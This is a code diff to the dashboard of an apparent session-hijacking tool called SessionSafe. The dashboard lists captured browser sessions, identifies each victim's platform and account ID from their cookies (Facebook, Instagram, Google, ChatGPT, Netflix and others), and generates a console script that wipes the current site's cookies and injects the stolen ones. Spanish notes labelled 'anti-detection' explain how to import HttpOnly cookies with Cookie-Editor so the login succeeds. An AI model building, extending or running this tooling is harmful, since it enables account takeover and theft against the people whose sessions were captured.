@@ -17,6 +17,7 @@ interface AccountInfo {
   icon: any;
   color: string;
   health: "active" | "expiring" | "expired";
+  domain: string;
 }
 
 const formatRelativeTime = (date: string) => {
@@ -58,55 +59,71 @@ export default function SessionsPage() {
     return "active";
   };
 
+  const getPrimaryDomainFromCookies = (sessionCookies: Cookie[]): string => {
+    if (sessionCookies.length === 0) return "unknown.com";
+    
+    // Prioritize domains with known suffixes or those that appear most frequently
+    const domainCounts: Record<string, number> = {};
+    sessionCookies.forEach(c => {
+      const d = c.domain.startsWith('.') ? c.domain.substring(1) : c.domain;
+      // Filter out common ad/tracker domains to find the "real" site
+      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics")) {
+        domainCounts[d] = (domainCounts[d] || 0) + 1;
+      }
+    });
+
+    const entries = Object.entries(domainCounts);
+    if (entries.length === 0) return sessionCookies[0].domain.replace(/^\./, "");
+    
+    // Return the domain with the highest count (most cookies)
+    return entries.sort((a, b) => b[1] - a[1])[0][0];
+  };
+
   const identifyAccount = (sessionCookies: Cookie[], fallbackId: string): AccountInfo => {
     const health = getHealthStatus(sessionCookies);
     const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
+    const primaryDomain = getPrimaryDomainFromCookies(sessionCookies);
     
     // Platform mapping
     if (domainStr.includes("facebook.com")) {
       const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
-      return { platform: "Facebook", identifier: fbId || "Account", icon: Facebook, color: "text-blue-500", health };
+      return { platform: "Facebook", identifier: fbId || "Account", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
     }
     if (domainStr.includes("instagram.com")) {
       const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
-      return { platform: "Instagram", identifier: igId || "Account", icon: Instagram, color: "text-pink-500", health };
+      return { platform: "Instagram", identifier: igId || "Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
     }
     if (domainStr.includes("youtube.com") || domainStr.includes("google.com/youtube")) {
-      return { platform: "YouTube", identifier: "Viewer", icon: Youtube, color: "text-red-500", health };
+      return { platform: "YouTube", identifier: "Viewer", icon: Youtube, color: "text-red-500", health, domain: "youtube.com" };
     }
     if (domainStr.includes("grok.com") || domainStr.includes("x.com/i/grok")) {
-      return { platform: "Grok AI", identifier: "Agent", icon: Bot, color: "text-purple-400", health };
+      return { platform: "Grok AI", identifier: "Agent", icon: Bot, color: "text-purple-400", health, domain: "grok.com" };
     }
     if (domainStr.includes("linkedin.com")) {
-      return { platform: "LinkedIn", identifier: "Professional", icon: Linkedin, color: "text-blue-600", health };
+      return { platform: "LinkedIn", identifier: "Professional", icon: Linkedin, color: "text-blue-600", health, domain: "linkedin.com" };
     }
     if (domainStr.includes("mercadolibre.com")) {
-      return { platform: "Mercado Libre", identifier: "Buyer", icon: ShoppingCart, color: "text-yellow-400", health };
+      return { platform: "Mercado Libre", identifier: "Buyer", icon: ShoppingCart, color: "text-yellow-400", health, domain: "mercadolibre.com" };
     }
     if (domainStr.includes("gemini.google.com")) {
-      return { platform: "Gemini", identifier: "AI Model", icon: MessageSquare, color: "text-blue-300", health };
+      return { platform: "Gemini", identifier: "AI Model", icon: MessageSquare, color: "text-blue-300", health, domain: "gemini.google.com" };
     }
     if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
-      return { platform: "ChatGPT", identifier: "AI Assistant", icon: Cpu, color: "text-emerald-400", health };
+      return { platform: "ChatGPT", identifier: "AI Assistant", icon: Cpu, color: "text-emerald-400", health, domain: "chatgpt.com" };
     if (domainStr.includes("kick.com"))
-      return { platform: "Kick", identifier: "Streamer", icon: Gamepad2, color: "text-green-500", health };
+      return { platform: "Kick", identifier: "Streamer", icon: Gamepad2, color: "text-green-500", health, domain: "kick.com" };
     if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
-      return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health };
+      return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health, domain: "x.com" };
     if (domainStr.includes("netflix.com"))
-      return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health };
+      return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health, domain: "netflix.com" };
     if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
-      return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health };
+      return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health, domain: "blackboard.com" };
     if (domainStr.includes("google.com"))
-      return { platform: "Google", identifier: "User", icon: Globe, color: "text-red-400", health };
+      return { platform: "Google", identifier: "User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
 
-    // Generic fallback based on domain if we found any cookie
-    if (sessionCookies.length > 0) {
-      const mainDomain = sessionCookies[0].domain.split('.').slice(-2)[0];
-      const capitalized = mainDomain.charAt(0).toUpperCase() + mainDomain.slice(1);
-      return { platform: capitalized, identifier: "Session", icon: Globe, color: "text-amber-400", health };
-    }
-
-    return { platform: "Unknown", identifier: fallbackId || "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
+    // Generic fallback based on primary domain found in cookies
+    const capitalized = primaryDomain.charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
+    return { platform: capitalized, identifier: "Session", icon: Shield, color: "text-amber-400", health, domain: primaryDomain };
   };
 
   const fetchSessions = async () => {
@@ -117,13 +134,13 @@ export default function SessionsPage() {
       .limit(100);
     
     if (sessionData) {
-      setSessions(sessionData);
       const sessionIds = sessionData.map(s => s.id);
+      
+      // Fetch identifying cookies for ALL sessions in one batch to identify platforms
       const { data: identifyingCookies } = await supabase
         .from("cookies")
         .select("*")
-        .in("snapshot_id", sessionIds)
-        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.auth_token,name.eq.SID,name.eq.NetflixId,name.eq.li_at,name.eq.dpr,name.eq.csrftoken,name.eq.sessionid,name.eq.LOGIN_INFO,name.eq.__Secure-1PSID,name.eq.x-session-id");
+        .in("snapshot_id", sessionIds);
       
       const newAccountMap: Record<string, AccountInfo> = {};
       sessionData.forEach(session => {
@@ -131,6 +148,7 @@ export default function SessionsPage() {
         newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
       });
       setAccountMap(newAccountMap);
+      setSessions(sessionData);
     }
     setLoading(false);
   };
@@ -141,7 +159,7 @@ export default function SessionsPage() {
       .from("cookies")
       .select("*")
       .eq("snapshot_id", snapshotId)
-      .limit(1500);
+      .limit(2000);
     if (data) setCookies(data);
     setLoadingCookies(false);
   };
@@ -158,40 +176,24 @@ export default function SessionsPage() {
     return `(function() {
   const cookies = ${JSON.stringify(cookies)};
   console.clear();
-  console.log('%c [SessionSafe] INICIANDO RESTAURACIÓN DEEP ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px; border-radius: 3px;');
+  console.log('%c [SessionSafe] INICIANDO RESTAURACIÓN ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px; border-radius: 3px;');
   
-  console.log('%c [1/3] Limpiando estado previo... ', 'color: #f59e0b;');
   document.cookie.split(";").forEach(function(c) { 
     const name = c.split("=")[0].trim();
     const domain = location.hostname;
-    const baseDomain = domain.split('.').slice(-2).join('.');
-    
     document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
     document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + domain;
     document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + domain;
-    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + baseDomain;
   });
 
-  console.log('%c [2/3] Inyectando ' + cookies.length + ' cookies... ', 'color: #3b82f6;');
-  let HttpOnlyCount = 0;
-  
   cookies.forEach(c => {
-    if (c.http_only) HttpOnlyCount++;
     try {
-      let cookieStr = c.name + '=' + c.value + 
+      document.cookie = c.name + '=' + c.value + 
                     '; domain=' + (c.domain.startsWith('.') ? c.domain : ('.' + c.domain)) + 
                     '; path=' + (c.path || '/') + 
                     '; SameSite=Lax; Secure';
-      document.cookie = cookieStr;
     } catch (e) {}
   });
-
-  console.log('%c [3/3] Verificando resultados... ', 'color: #10b981;');
-  if (HttpOnlyCount > 0) {
-    console.warn('%c [!] ATENCIÓN: Se detectaron ' + HttpOnlyCount + ' cookies HttpOnly. ', 'background: #7c2d12; color: #fbbf24; padding: 3px;');
-    console.warn('Nota: Las cookies HttpOnly (como el sessionid) NO se pueden inyectar desde la consola.');
-    console.warn('Usa la opción "Descargar JSON" e impórtalo en Cookie-Editor.');
-  }
 
   console.log('%c ¡CAPTURA COMPLETADA! Recargando... ', 'background: #10b981; color: #fff; font-weight: bold; padding: 5px;');
   setTimeout(() => location.reload(), 1500);
@@ -240,7 +242,8 @@ export default function SessionsPage() {
   const filteredSessions = sessions.filter(s => 
     s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
     accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
-    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase())
+    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase()) ||
+    accountMap[s.id]?.domain.toLowerCase().includes(searchTerm.toLowerCase())
   );
 
   return (
@@ -259,7 +262,7 @@ export default function SessionsPage() {
               <Search className="text-gray-500 mr-2" size={18} />
               <input 
                 type="text" 
-                placeholder="Search platforms..." 
+                placeholder="Search sessions..." 
                 className="bg-transparent border-none outline-none text-sm w-full py-2 placeholder:text-gray-600"
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
@@ -281,7 +284,7 @@ export default function SessionsPage() {
         ) : (
           <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
             {filteredSessions.map((session) => {
-              const info = accountMap[session.id] || { platform: "Unknown", identifier: "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
+              const info = accountMap[session.id] || { platform: "Unknown", identifier: "Anonymous", icon: Shield, color: "text-gray-400", health: "active", domain: "unknown" };
               const UAIcon = getDeviceIcon(session.user_agent);
               
               return (
@@ -310,6 +313,9 @@ export default function SessionsPage() {
                     </div>
                   </div>
                   <div>
+                    <div className="text-[10px] font-bold text-blue-400/80 uppercase tracking-widest mb-1 px-1">
+                      {info.domain}
+                    </div>
                     <h4 className="font-extrabold text-lg truncate text-white/90 mb-1">{info.identifier}</h4>
                     <div className="flex items-center justify-between mt-3">
                       <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-500">
@@ -377,7 +383,7 @@ export default function SessionsPage() {
                         <div>
                           <h3 className="text-4xl font-black text-white/90">{accountMap[selectedSession.id]?.platform}</h3>
                           <div className="flex items-center gap-2 text-gray-500 font-bold mt-1 uppercase text-xs tracking-widest">
-                            <Clock size={14} /> CAPTURA: {new Date(selectedSession.captured_at).toLocaleString()}
+                            <Clock size={14} /> CAPTURA: {new Date(selectedSession.captured_at).toLocaleString()} | {accountMap[selectedSession.id]?.domain}
                           </div>
                         </div>
                       </div>
@@ -436,7 +442,7 @@ export default function SessionsPage() {
                       <div className="p-5 rounded-[1.5rem] bg-amber-500/5 border border-amber-500/10 flex gap-4">
                          <div className="p-3 rounded-xl bg-amber-500/10 h-fit text-amber-400"><Info size={20} /></div>
                          <p className="text-[12px] text-amber-200/60 leading-relaxed font-medium">
-                           <b>SISTEMA ANTI-DETECCIÓN:</b> Si el sitio tiene cookies HttpOnly (como Instagram), la consola no podrá inyectarlas todas. Usa el botón **JSON** e impórtalo con la extensión **"Cookie-Editor"** para entrada total.
+                           <b>ANTI-DETECCIÓN:</b> Usa el botón **JSON** e impórtalo con **Cookie-Editor**. La consola no puede inyectar cookies "HttpOnly" y el login fallará en sitios protegidos.
                          </p>
                       </div>
                     </div>
